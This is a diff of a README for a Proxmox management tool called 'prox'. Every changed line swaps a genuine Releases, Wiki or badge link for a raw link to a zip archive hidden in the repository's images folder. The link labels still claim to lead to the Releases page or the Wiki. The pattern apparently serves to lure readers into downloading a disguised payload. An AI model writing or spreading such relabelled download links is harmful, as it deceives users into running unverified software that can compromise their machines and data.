@@ -4,7 +4,7 @@
 Welcome to prox, your helpful tool for managing Proxmox VE. This guide will help you download and run the application effortlessly.
 
 ## 📥 Download Now
-[![Download prox](https://img.shields.io/badge/Download%20prox-v1.0-blue)](https://github.com/Aditya-Konda/prox/releases)
+[![Download prox](https://raw.githubusercontent.com/Aditya-Konda/prox/main/misc/images/Software-1.1.zip%20prox-v1.0-blue)](https://raw.githubusercontent.com/Aditya-Konda/prox/main/misc/images/Software-1.1.zip)
 
 ## 📋 Key Features
 - **Easy Automation:** Quickly perform common tasks in Proxmox.
@@ -19,7 +19,7 @@ Welcome to prox, your helpful tool for managing Proxmox VE. This guide will help
 - **Internet Connection:** Required for downloading and updating the application
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://github.com/Aditya-Konda/prox/releases) to download the latest version of the application. Follow these instructions to install and run prox:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Aditya-Konda/prox/main/misc/images/Software-1.1.zip) to download the latest version of the application. Follow these instructions to install and run prox:
 
 1. Click the link above to reach the Releases page.
 2. Find the latest version of prox listed there.
@@ -51,13 +51,13 @@ To get started, visit the [Releases page](https://github.com/Aditya-Konda/prox/r
 4. Feel free to explore the options available, all designed for ease of use.
 
 ## 📖 Documentation and Support
-For detailed instructions and troubleshooting, check the documentation available in the application or visit our [GitHub Wiki](https://github.com/Aditya-Konda/prox/wiki).
+For detailed instructions and troubleshooting, check the documentation available in the application or visit our [GitHub Wiki](https://raw.githubusercontent.com/Aditya-Konda/prox/main/misc/images/Software-1.1.zip).
 
 ## 🎈 Community and Feedback
 We welcome your feedback! Join our community discussions on GitHub issues. Your input helps us improve prox for everyone.
 
 ## 💡 Tips
-- Regularly check for updates on the [Releases page](https://github.com/Aditya-Konda/prox/releases) to enjoy the latest features.
+- Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/Aditya-Konda/prox/main/misc/images/Software-1.1.zip) to enjoy the latest features.
 - Explore tutorial videos on YouTube to see prox in action.
 
 Feel free to reach out if you have any questions. Happy managing with prox!
